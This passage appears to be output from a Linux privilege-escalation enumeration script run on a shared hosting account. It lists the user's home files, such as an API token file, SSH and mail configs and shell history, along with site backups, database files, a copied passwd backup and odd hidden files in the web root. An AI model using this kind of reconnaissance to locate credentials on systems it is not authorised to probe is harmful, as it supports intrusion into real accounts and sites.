/home/u311353020/.cagefs/tmp/L9aYHy.gif
/tmp/4sKNFu.gif
/tmp/p7HqAH.gif
/tmp/gQCADL.gif
/tmp/L9aYHy.gif


╔══════════╣ Files inside /home/u311353020 (limit 20)
total 92
drwx--x--- 10 u311353020 apache     4096 Apr 20 12:20 .
drwxr-xr-x  4 root       root       4096 Oct  2  2023 ..
-r--r-----  1 u311353020 o50030915    40 Jan  7 17:34 .api_token
-rw-------  1 u311353020 o50030915   968 Apr 20 23:15 .bash_history
drwxrwx--x  5 u311353020 o50030915  4096 Oct  2  2023 .cagefs
drwxr-xr-x  2 u311353020 o50030915  4096 Apr  3 08:07 .cl.selector
drwxr-xr-x  2 u311353020 o50030915  4096 Sep  4  2024 .filebrowser
drwx------  2 u311353020 o50030915  4096 Apr 21 00:24 .gnupg
drwxr-xr-x  2 u311353020 o50030915  4096 Sep 18  2024 .logs
-rw-------  1 u311353020 o50030915   181 Nov 20 09:10 .msmtprc
drwx------  2 u311353020 o50030915  4096 Oct  2  2023 .ssh
drwxr-xr-x  3 u311353020 o50030915  4096 May 29  2022 .wp-cli
-rw-r--r--  1 u311353020 o50030915     0 Aug 11  2020 DO_NOT_UPLOAD_HERE
drwxr-xr-x 16 u311353020 o50030915  4096 Aug 21  2024 domains
-rw-r--r--  1 u311353020 o50030915 19481 Oct  9  2024 error_log
lrwxrwxrwx  1 u311353020 o50030915    34 Aug 11  2020 public_html -> domains/grupors.com.mx/public_html

╔══════════╣ Files inside others home (limit 20)
/var/www/html/.aaa.html
/var/www/html/.aaa.ini
/var/www/html/.aaa.log
/var/www/html/.aaa.pdf

╔══════════╣ Searching installed mail applications
exim
sendmail
sendmail.bak
sendmail.exim

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup folders
drwxr-xr-x 2 u311353020 o50030915 4096 May 29  2022 /home/u311353020/domains/entornoclean.mx/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/backups
total 28
-rw-r--r-- 1 u311353020 o50030915 7437 May 29  2022 backups-list.php
-rw-r--r-- 1 u311353020 o50030915 2371 May 29  2022 backups-permissions.php
-rw-r--r-- 1 u311353020 o50030915 3581 May 29  2022 index.php

drwxr-xr-x 2 u311353020 o50030915 4096 Aug 23  2020 /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/backups
total 0

drwxr-xr-x 2 u311353020 o50030915 4096 Mar 11  2021 /home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/plugins/all-in-one-wp-migration/lib/view/backups
total 28
-rw-r--r-- 1 u311353020 o50030915 6007 Mar 11  2021 backups-list.php
-rw-r--r-- 1 u311353020 o50030915 2371 Mar 11  2021 backups-permissions.php
-rw-r--r-- 1 u311353020 o50030915 3881 Mar 11  2021 index.php

drwxr-xr-x 2 u311353020 o50030915 4096 Mar 15 23:41 /home/u311353020/domains/sefinad.com/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/backups
total 28
-rw-r--r-- 1 u311353020 o50030915 7970 Mar 15 23:41 backups-list.php
-rw-r--r-- 1 u311353020 o50030915 2440 Mar 15 23:41 backups-permissions.php
-rw-r--r-- 1 u311353020 o50030915 3635 Mar 15 23:41 index.php

drwxr-xr-x 3 root root 4096 May  8  2024 /opt/alt/python311/lib/python3.11/site-packages/botocore/data/backup
total 4
drwxr-xr-x 2 root root 4096 May  8  2024 2018-11-15

drwxr-xr-x 3 root root 4096 Aug  9  2023 /opt/alt/python37/lib/python3.7/site-packages/botocore/data/backup
total 4
drwxr-xr-x 2 root root 4096 Aug  9  2023 2018-11-15

dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/aws/aws-sdk-go@v1.44.156/models/apis/backup
total 4
dr-xr-xr-x 2 root root 4096 Aug  9  2023 2018-11-15

dr-xr-xr-x 3 root root 4096 Aug  9  2023 /opt/go/pkg/mod/github.com/aws/aws-sdk-go@v1.44.156/service/backup
total 784
-r--r--r-- 1 root root 783308 Aug  9  2023 api.go
dr-xr-xr-x 2 root root   4096 Aug  9  2023 backupiface
-r--r--r-- 1 root root   1317 Aug  9  2023 doc.go
-r--r--r-- 1 root root   3630 Aug  9  2023 errors.go
-r--r--r-- 1 root root   3422 Aug  9  2023 service.go


╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 161 Sep 12  2024 /usr/local/lsws/share/autoindex/default.php.old
-rwxr-xr-x 3 root root 25058 Oct 29 15:26 /usr/local/sbin/myrocks_hotbackup
-rwxr-xr-x 3 root root 49254 Oct 29 15:27 /usr/local/sbin/wsrep_sst_mariabackup
-rwxr-xr-x 3 root root 2447 Oct 29 15:27 /usr/local/sbin/wsrep_sst_backup
-rwxr-xr-x 1 root root 1048 Jan  3  2024 /usr/sbin/sendmail.bak
-rw-r--r-- 1 root root 1703 Jun  5  2024 /usr/include/mysql/server/private/backup.h
-rw-r--r-- 1 root root 1547 Jun  5  2024 /usr/include/mysql/server/private/aria_backup.h
-rw-r--r-- 1 root root 330 Jun  5  2024 /usr/share/man/man1/mariabackup.1.gz
-rw-r--r-- 1 root root 345 Jun  5  2024 /usr/share/man/man1/wsrep_sst_mariabackup.1.gz
-rw-r--r-- 1 root root 1454 Jun  5  2024 /usr/share/man/man1/myrocks_hotbackup.1.gz
-rw-r--r-- 1 root root 2670 Dec  8  2016 /usr/share/man/man1/db_hotbackup.1.gz
-rw-r--r-- 1 root root 42 Jun  5  2024 /usr/share/man/man1/mariadb-backup.1.gz
-rw-r--r-- 1 root root 2500 Sep  5  2023 /lib/modules/4.18.0-477.21.1.lve.1.el8.x86_64/kernel/drivers/net/team/team_mode_activebackup.ko.xz
-rw-r--r-- 1 root root 2500 Jul 17  2023 /lib/modules/4.18.0-477.13.1.lve.1.el8.x86_64/kernel/drivers/net/team/team_mode_activebackup.ko.xz
-rw-r--r-- 1 root root 2556 Jan 18  2024 /lib/modules/4.18.0-513.11.1.lve.el8.x86_64/kernel/drivers/net/team/team_mode_activebackup.ko.xz
-r--r--r-- 1 root root 185999896 Jun  5  2024 /lib/debug/usr/bin/mariadb-backup-10.11.8-1.module_el8.9.0+6829+4bb021a7.x86_64.debug
-rw-r--r-- 1 root root 367 Aug 29  2023 /opt/sut/config/backup_cfg.dat
-rw-r--r-- 1 root 89939 0 Feb  2  2022 /opt/gsutil/third_party/httplib2/ref/img2.old
-rw-r--r-- 1 root 89939 147 Feb  2  2022 /opt/gsutil/third_party/httplib2/ref/img1.old
-rw-r--r-- 1 u311353020 o50030915 10884 Mar 15  2021 /home/u311353020/domains/servigopa.com/public_html/default.php.bak
-rw-r--r-- 1 u311353020 o50030915 10884 Mar 15  2021 /home/u311353020/domains/entornoclean.com/public_html/default.php.bak
-rw-r--r-- 1 u311353020 o50030915 10884 Mar 15  2021 /home/u311353020/domains/suministrosdelimpieza.com/public_html/default.php.bak
-rw-r--r-- 1 u311353020 o50030915 351 Jul  6  2024 /home/u311353020/domains/fanrich.com.mx/public_html/wp-content/plugins/duplicator/installer/dup-installer/templates/default/parts/restore-backup-mode-notice.php
-rw-r--r-- 1 u311353020 o50030915 2144 Jul  6  2024 /home/u311353020/domains/fanrich.com.mx/public_html/wp-content/plugins/duplicator/installer/dup-installer/templates/default/pages-parts/step1/info-tabs/overviews/restore-backup.php
-rw-r--r-- 1 u311353020 o50030915 606 Jul  6  2024 /home/u311353020/domains/fanrich.com.mx/public_html/wp-content/plugins/duplicator/installer/dup-installer/templates/import-advanced/pages-parts/step1/info-tabs/restore-backup.php
-rw-r--r-- 1 u311353020 o50030915 714 Apr 11  2024 /home/u311353020/domains/farmaceuticaambriz.com/public_html/.htaccess.bk
-rw-r--r-- 1 u311353020 o50030915 714 Aug 13  2024 /home/u311353020/domains/hipermaq.com/public_html/.htaccess.bk
-rw-r--r-- 1 u311353020 o50030915 10884 Mar 15  2021 /home/u311353020/domains/hipermaq.com/public_html/default.php.bak
-rw-r--r-- 1 u311353020 o50030915 609 Aug 23  2020 /home/u311353020/domains/grupors.com.mx/public_html/ventas/user_privileges/enable_backup.php
-rw-r--r-- 1 u311353020 o50030915 723 Mar 11  2021 /home/u311353020/domains/grupors.com.mx/public_html/old/site/.htaccess.bk
-rw-r--r-- 1 u311353020 o50030915 50238 Mar 16  2021 /home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/plugins/defender-security/src/component/backup-settings.php
-rw-r--r-- 1 u311353020 o50030915 18 Mar 16  2021 /home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/plugins/defender-security/vault/sample.bak
-rw-r--r-- 1 u311353020 o50030915 19078 Mar 16  2021 /home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/plugins/wp-smushit/core/modules/class-backup.php
-rw-r--r-- 1 u311353020 o50030915 4847 Mar 11  2021 /home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/plugins/all-in-one-wp-migration/lib/controller/class-ai1wm-backups-controller.php
-rw-r--r-- 1 u311353020 o50030915 4812 Mar 11  2021 /home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/plugins/all-in-one-wp-migration/lib/model/class-ai1wm-backups.php
-rw-r--r-- 1 u311353020 o50030915 18259 Mar 11  2021 /home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/plugins/all-in-one-wp-migration/lib/view/assets/css/backups.min.rtl.css
-rw-r--r-- 1 u311353020 o50030915 18263 Mar 11  2021 /home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/plugins/all-in-one-wp-migration/lib/view/assets/css/backups.min.css
-rw-r--r-- 1 u311353020 o50030915 63029 Mar 11  2021 /home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/plugins/all-in-one-wp-migration/lib/view/assets/javascript/backups.min.js
-rw-r--r-- 1 u311353020 o50030915 2300 Mar 11  2021 /home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/plugins/all-in-one-wp-migration/lib/view/main/backups-htaccess-notice.php
-rw-r--r-- 1 u311353020 o50030915 2297 Mar 11  2021 /home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/plugins/all-in-one-wp-migration/lib/view/main/backups-path-notice.php
-rw-r--r-- 1 u311353020 o50030915 2302 Mar 11  2021 /home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/plugins/all-in-one-wp-migration/lib/view/main/backups-index-html-notice.php
-rw-r--r-- 1 u311353020 o50030915 2301 Mar 11  2021 /home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/plugins/all-in-one-wp-migration/lib/view/main/backups-webconfig-notice.php
-rw-r--r-- 1 u311353020 o50030915 2301 Mar 11  2021 /home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/plugins/all-in-one-wp-migration/lib/view/main/backups-index-php-notice.php
-rw-r--r-- 1 u311353020 o50030915 6007 Mar 11  2021 /home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/plugins/all-in-one-wp-migration/lib/view/backups/backups-list.php
-rw-r--r-- 1 u311353020 o50030915 2371 Mar 11  2021 /home/u311353020/domains/grupors.com.mx/public_html/old/site/wp-content/plugins/all-in-one-wp-migration/lib/view/backups/backups-permissions.php
-rw-r--r-- 1 u311353020 o50030915 23284 Aug 23  2020 /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/backup.php
-rw-r--r-- 1 u311353020 o50030915 2127 Aug 23  2020 /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/includes/modules/security_check/extended/admin_backup_directory_listing.php
-rw-r--r-- 1 u311353020 o50030915 3040 Aug 23  2020 /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/includes/modules/security_check/extended/admin_backup_file.php
-rw-r--r-- 1 u311353020 o50030915 2812 Aug 23  2020 /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/includes/languages/espanol/backup.php
-rw-r--r-- 1 u311353020 o50030915 2609 Aug 23  2020 /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/includes/languages/english/backup.php
-rw-r--r-- 1 u311353020 o50030915 616 Aug 23  2020 /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/includes/languages/english/modules/security_check/extended/admin_backup_directory_listing.php
-rw-r--r-- 1 u311353020 o50030915 517 Aug 23  2020 /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/includes/languages/english/modules/security_check/extended/admin_backup_file.php
-rw-r--r-- 1 u311353020 o50030915 2914 Aug 23  2020 /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/includes/languages/german/backup.php
-rw-r--r-- 1 u311353020 o50030915 714 Nov 21  2022 /home/u311353020/domains/sefinad.com/public_html/.htaccess.bk
-rw-r--r-- 1 u311353020 o50030915 7091 Mar 15 23:41 /home/u311353020/domains/sefinad.com/public_html/wp-content/plugins/all-in-one-wp-migration/lib/controller/class-ai1wm-backups-controller.php
-rw-r--r-- 1 u311353020 o50030915 5742 Mar 15 23:41 /home/u311353020/domains/sefinad.com/public_html/wp-content/plugins/all-in-one-wp-migration/lib/model/class-ai1wm-backups.php
-rw-r--r-- 1 u311353020 o50030915 24143 Mar 15 23:41 /home/u311353020/domains/sefinad.com/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/assets/css/backups.min.rtl.css
-rw-r--r-- 1 u311353020 o50030915 24136 Mar 15 23:41 /home/u311353020/domains/sefinad.com/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/assets/css/backups.min.css
-rw-r--r-- 1 u311353020 o50030915 130 Mar 15 23:41 /home/u311353020/domains/sefinad.com/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/assets/javascript/backups.min.js.LICENSE.txt
-rw-r--r-- 1 u311353020 o50030915 240274 Mar 15 23:41 /home/u311353020/domains/sefinad.com/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/assets/javascript/backups.min.js
-rw-r--r-- 1 u311353020 o50030915 2253 Mar 15 23:41 /home/u311353020/domains/sefinad.com/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/main/backups-htaccess-notice.php
-rw-r--r-- 1 u311353020 o50030915 2266 Mar 15 23:41 /home/u311353020/domains/sefinad.com/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/main/backups-path-notice.php
-rw-r--r-- 1 u311353020 o50030915 2255 Mar 15 23:41 /home/u311353020/domains/sefinad.com/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/main/backups-index-html-notice.php
-rw-r--r-- 1 u311353020 o50030915 2254 Mar 15 23:41 /home/u311353020/domains/sefinad.com/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/main/backups-webconfig-notice.php
-rw-r--r-- 1 u311353020 o50030915 2254 Mar 15 23:41 /home/u311353020/domains/sefinad.com/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/main/backups-index-php-notice.php
-rw-r--r-- 1 u311353020 o50030915 2233 Mar 15 23:41 /home/u311353020/domains/sefinad.com/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/main/backups.php
-rw-r--r-- 1 u311353020 o50030915 2255 Mar 15 23:41 /home/u311353020/domains/sefinad.com/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/main/backups-robots-txt-notice.php
-rw-r--r-- 1 u311353020 o50030915 7970 Mar 15 23:41 /home/u311353020/domains/sefinad.com/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/backups/backups-list.php
-rw-r--r-- 1 u311353020 o50030915 2440 Mar 15 23:41 /home/u311353020/domains/sefinad.com/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/backups/backups-permissions.php
-rw-r--r-- 1 u311353020 o50030915 714 May 29  2022 /home/u311353020/domains/entornoclean.mx/public_html/.htaccess.bk
-rw-r--r-- 1 u311353020 o50030915 10884 May 23  2021 /home/u311353020/domains/entornoclean.mx/public_html/default.php.bak
-rw-r--r-- 1 u311353020 o50030915 6740 May 29  2022 /home/u311353020/domains/entornoclean.mx/public_html/wp-content/plugins/all-in-one-wp-migration/lib/controller/class-ai1wm-backups-controller.php
-rw-r--r-- 1 u311353020 o50030915 5178 May 29  2022 /home/u311353020/domains/entornoclean.mx/public_html/wp-content/plugins/all-in-one-wp-migration/lib/model/class-ai1wm-backups.php
-rw-r--r-- 1 u311353020 o50030915 23892 May 29  2022 /home/u311353020/domains/entornoclean.mx/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/assets/css/backups.min.rtl.css
-rw-r--r-- 1 u311353020 o50030915 23886 May 29  2022 /home/u311353020/domains/entornoclean.mx/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/assets/css/backups.min.css
-rw-r--r-- 1 u311353020 o50030915 186293 May 29  2022 /home/u311353020/domains/entornoclean.mx/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/assets/javascript/backups.min.js
-rw-r--r-- 1 u311353020 o50030915 2300 May 29  2022 /home/u311353020/domains/entornoclean.mx/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/main/backups-htaccess-notice.php
-rw-r--r-- 1 u311353020 o50030915 2297 May 29  2022 /home/u311353020/domains/entornoclean.mx/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/main/backups-path-notice.php
-rw-r--r-- 1 u311353020 o50030915 2302 May 29  2022 /home/u311353020/domains/entornoclean.mx/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/main/backups-index-html-notice.php
-rw-r--r-- 1 u311353020 o50030915 2301 May 29  2022 /home/u311353020/domains/entornoclean.mx/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/main/backups-webconfig-notice.php
-rw-r--r-- 1 u311353020 o50030915 2301 May 29  2022 /home/u311353020/domains/entornoclean.mx/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/main/backups-index-php-notice.php
-rw-r--r-- 1 u311353020 o50030915 2145 May 29  2022 /home/u311353020/domains/entornoclean.mx/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/main/backups.php
-rw-r--r-- 1 u311353020 o50030915 2302 May 29  2022 /home/u311353020/domains/entornoclean.mx/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/main/backups-robots-txt-notice.php
-rw-r--r-- 1 u311353020 o50030915 7437 May 29  2022 /home/u311353020/domains/entornoclean.mx/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/backups/backups-list.php
-rw-r--r-- 1 u311353020 o50030915 2371 May 29  2022 /home/u311353020/domains/entornoclean.mx/public_html/wp-content/plugins/all-in-one-wp-migration/lib/view/backups/backups-permissions.php
-rw-r--r-- 1 u311353020 o50030915 974 Apr 20 11:08 /home/u311353020/.cagefs/tmp/passwd.bak
-rw-r--r-- 1 u311353020 o50030915 974 Apr 20 11:08 /tmp/passwd.bak

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /etc/pki/nssdb/cert8.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
Found /etc/pki/nssdb/cert9.db: SQLite 3.x database, last written using SQLite version 0
Found /etc/pki/nssdb/key3.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
Found /etc/pki/nssdb/key4.db: SQLite 3.x database, last written using SQLite version 0
Found /etc/pki/nssdb/secmod.db: Berkeley DB 1.85 (Hash, version 2, native byte-order)
Found /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/fckeditor/editor/plugins/imanager/images/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/fckeditor/editor/plugins/imanager/images/examples/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/fckeditor/editor/plugins/imanager/interface/images/fckeditor/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/fckeditor/editor/plugins/imanager/interface/images/htmlarea/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/fckeditor/editor/plugins/imanager/interface/images/spaw/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/fckeditor/editor/plugins/imanager/interface/images/tinyMCE/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/fckeditor/editor/plugins/imanager/interface/images/xinha/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/fckeditor/editor/plugins/imanager/masks/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/fckeditor/editor/plugins/imanager/olays/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/fckeditor/editor/plugins/imanager/scripts/phpCrop/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/fckeditor/editor/plugins/imanager/scripts/phpThumb/cache/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/fckeditor/editor/plugins/imanager/temp/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /home/u311353020/domains/grupors.com.mx/public_html/old/admin_np/fckeditor/editor/plugins/imanager/wmarks/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /home/u311353020/domains/grupors.com.mx/public_html/old/phpThumb/watermarks/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /home/u311353020/domains/grupors.com.mx/public_html/ventas/layouts/vlayout/skins/images/Thumbs.db: Composite Document File V2 Document, Cannot read section info
Found /home/u311353020/domains/grupors.com.mx/public_html/ventas/libraries/jquery/colorpicker/images/Thumbs.db: Composite Document File V2 Document, Cannot read section info

 -> Extracting tables from /etc/pki/nssdb/cert9.db (limit 20)
 -> Extracting tables from /etc/pki/nssdb/key4.db (limit 20)

╔══════════╣ Web files?(output limit)
/var/www/:
total 12K
drwxr-xr-x  3 root root 4.0K Aug  9  2023 .
drwxr-xr-x 11 root root 4.0K Aug 29  2023 ..
drwxr-xr-x  2 root root 4.0K Apr 20 19:02 html

/var/www/html:
total 40K
drwxr-xr-x 2 root root 4.0K Apr 20 19:02 .
drwxr-xr-x 3 root root 4.0K Aug  9  2023 ..

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 65 Jun 28  2022 /usr/lib64/.libgcrypt.so.20.hmac
-rw-r--r-- 1 root root 65 Jan 10  2024 /usr/lib64/.libgnutls.so.30.28.2.hmac
-rw-r--r-- 1 root root 65 Oct  8  2021 /usr/lib64/.libnettle.so.6.5.hmac
-rw-r--r-- 1 root root 65 Dec 18  2023 /usr/lib64/.libssl.so.1.1.1k.hmac
-rw-r--r-- 1 root root 65 Oct  9  2021 /usr/lib64/.libcrypt.so.1.1.0.hmac
-rw-r--r-- 1 root root 65 Dec 18  2023 /usr/lib64/.libcrypto.so.1.1.1k.hmac
-rw-r--r-- 1 root root 65 Oct  8  2021 /usr/lib64/.libhogweed.so.4.5.hmac
-rw-r--r-- 1 root root 40 Aug  3  2022 /usr/share/man/man1/..1.gz
-rw-r--r-- 1 root root 42 Nov 15  2023 /usr/share/man/man5/.k5identity.5.gz
-rw------- 1 root root 0 Aug 12  2023 /usr/share/GeoIP/.geoipupdate.lock
-rw-rw-r-- 1 root root 6027 Apr 20 19:02 /var/www/html/.aaa.html
-rw-rw-r-- 1 root root 6027 Apr 20 19:02 /var/www/html/.aaa.ini
-rw-rw-r-- 1 root root 6027 Apr 20 19:02 /var/www/html/.aaa.log
-rw-rw-r-- 1 root root 6027 Apr 20 19:02 /var/www/html/.aaa.pdf
-r-------- 1 u311353020 root 16 Oct  2  2023 /var/.cagefs/.cagefs.token
-rw-r--r-- 1 root root 65 Jun 28  2022 /lib64/.libgcrypt.so.20.hmac
-rw-r--r-- 1 root root 65 Jan 10  2024 /lib64/.libgnutls.so.30.28.2.hmac
-rw-r--r-- 1 root root 65 Oct  8  2021 /lib64/.libnettle.so.6.5.hmac
-rw-r--r-- 1 root root 65 Dec 18  2023 /lib64/.libssl.so.1.1.1k.hmac
-rw-r--r-- 1 root root 65 Oct  9  2021 /lib64/.libcrypt.so.1.1.0.hmac
-rw-r--r-- 1 root root 65 Dec 18  2023 /lib64/.libcrypto.so.1.1.1k.hmac
-rw-r--r-- 1 root root 65 Oct  8  2021 /lib64/.libhogweed.so.4.5.hmac
-rw-r--r-- 1 root root 177 Sep  5  2023 /lib/modules/4.18.0-477.21.1.lve.1.el8.x86_64/.vmlinuz.hmac
-rw-r--r-- 1 root root 177 Jul 17  2023 /lib/modules/4.18.0-477.13.1.lve.1.el8.x86_64/.vmlinuz.hmac
-rw-r--r-- 1 root root 175 Jan 18  2024 /lib/modules/4.18.0-513.11.1.lve.el8.x86_64/.vmlinuz.hmac
-rw-r--r-- 1 root root 0 Oct 14  2023 /lib/dracut/modules.d/99squash/.shchkdir
-rw-r--r-- 1 root root 280 Dec 21  2022 /lib/x86_64-linux-gnu/firmware-hdd-d355375539-HPS4-13.1/.cpq_package.inc
-rwxr-xr-x 1 root root 9719 Dec 21  2022 /lib/x86_64-linux-gnu/firmware-hdd-d355375539-HPS4-13.1/.setup
-rw-r--r-- 1 root root 375 Jul 29  2023 /lib/x86_64-linux-gnu/firmware-hdd-035a863453-HPK5-4.1/.cpq_package.inc
-rwxr-xr-x 1 root root 9719 Jul 29  2023 /lib/x86_64-linux-gnu/firmware-hdd-035a863453-HPK5-4.1/.setup
-rw-r--r-- 1 root root 18 Aug  3  2022 /etc/skel/.bash_logout
-rw------- 1 root root 3 Mar 26 19:37 /etc/.etc.version
-r--r--r-- 1 root root 9353 Aug  9  2023 /opt/go/pkg/mod/go.opentelemetry.io/otel@v1.11.1/.golangci.yml
-r--r--r-- 1 root root 309 Aug  9  2023 /opt/go/pkg/mod/go.opentelemetry.io/otel@v1.11.1/.markdownlint.yaml
-r--r--r-- 1 root root 103 Aug  9  2023 /opt/go/pkg/mod/go.opentelemetry.io/otel@v1.11.1/.lycheeignore
-rw-r--r-- 1 65537 1004 18 Aug  3  2022 /opt/ipmi_exporter/.bash_logout
-rwxr-xr-x 1 root root 301 Aug 29  2023 /opt/HPEMRSA/LSIStorageAuthority/.__uninst.sh
-rw-r--r-- 1 root root 19159 Aug  9  2023 /opt/alt/php70/usr/share/pear/.filemap
-rw-r--r-- 1 root root 0 Aug  9  2023 /opt/alt/php70/usr/share/pear/.lock
-rw-r--r-- 1 root root 19159 Aug  9  2023 /opt/alt/php71/usr/share/pear/.filemap
-rw-r--r-- 1 root root 0 Aug  9  2023 /opt/alt/php71/usr/share/pear/.lock
-rw-r--r-- 1 root root 7521 Aug 10  2023 /opt/alt/php83/usr/share/pear/.filemap
-rw-r--r-- 1 root root 0 Aug 10  2023 /opt/alt/php83/usr/share/pear/.lock
-rw-r--r-- 1 root root 7521 Dec 17 18:12 /opt/alt/php84/usr/share/pear/.filemap
-rw-r--r-- 1 root root 0 Dec 17 18:12 /opt/alt/php84/usr/share/pear/.lock
-rw-r--r-- 1 root root 19811 Aug  9  2023 /opt/alt/php52/usr/share/pear/.filemap
-rw-r--r-- 1 root root 0 Aug  9  2023 /opt/alt/php52/usr/share/pear/.lock
-rw-r--r-- 1 root root 391246 Aug  9  2023 /opt/alt/php54/usr/share/pear/.filemap
-rw-r--r-- 1 root root 0 Dec 18  2019 /opt/alt/php54/usr/share/pear/test/HttpFoundation/Symfony/Component/HttpFoundation/Tests/File/Fixtures/directory/.empty
-rw-r--r-- 1 root root 1 Dec 18  2019 /opt/alt/php54/usr/share/pear/test/HttpFoundation/Symfony/Component/HttpFoundation/Tests/File/Fixtures/.unknownextension
-rw-r--r-- 1 root root 0 Aug  9  2023 /opt/alt/php54/usr/share/pear/.lock
-rw-r--r-- 1 root root 22 Nov  6  2023 /opt/alt/krb5/usr/share/man/man5/.k5identity.5
-rw-r--r-- 1 root root 395623 Aug  9  2023 /opt/alt/php55/usr/share/pear/.filemap
-rw-r--r-- 1 root root 0 Dec 18  2019 /opt/alt/php55/usr/share/pear/test/HttpFoundation/Symfony/Component/HttpFoundation/Tests/File/Fixtures/directory/.empty
-rw-r--r-- 1 root root 1 Dec 18  2019 /opt/alt/php55/usr/share/pear/test/HttpFoundation/Symfony/Component/HttpFoundation/Tests/File/Fixtures/.unknownextension
-rw-r--r-- 1 root root 0 Aug  9  2023 /opt/alt/php55/usr/share/pear/.lock
-rw-r--r-- 1 root root 19159 Aug  9  2023 /opt/alt/php73/usr/share/pear/.filemap
-rw-r--r-- 1 root root 0 Aug  9  2023 /opt/alt/php73/usr/share/pear/.lock
-rw-r--r-- 1 root root 7521 Apr 19  2021 /opt/alt/php80/usr/share/pear/.filemap
-rw-r--r-- 1 root root 0 Apr 19  2021 /opt/alt/php80/usr/share/pear/.lock
-rw-r--r-- 1 root root 1 Oct 31  2023 /opt/alt/libxml2/usr/share/doc/alt-libxml2-devel/examples/.memdump
-rw-r--r-- 1 root root 65 Oct  6  2022 /opt/alt/openssl/lib64/.libssl.so.1.0.2u.hmac
-rw-r--r-- 1 root root 65 Oct  6  2022 /opt/alt/openssl/lib64/.libcrypto.so.1.0.2u.hmac
-rw-r--r-- 1 root root 392471 Aug  9  2023 /opt/alt/php53/usr/share/pear/.filemap
-rw-r--r-- 1 root root 0 Dec 18  2019 /opt/alt/php53/usr/share/pear/test/HttpFoundation/Symfony/Component/HttpFoundation/Tests/File/Fixtures/directory/.empty
-rw-r--r-- 1 root root 1 Dec 18  2019 /opt/alt/php53/usr/share/pear/test/HttpFoundation/Symfony/Component/HttpFoundation/Tests/File/Fixtures/.unknownextension
-rw-r--r-- 1 root root 0 Aug  9  2023 /opt/alt/php53/usr/share/pear/.lock
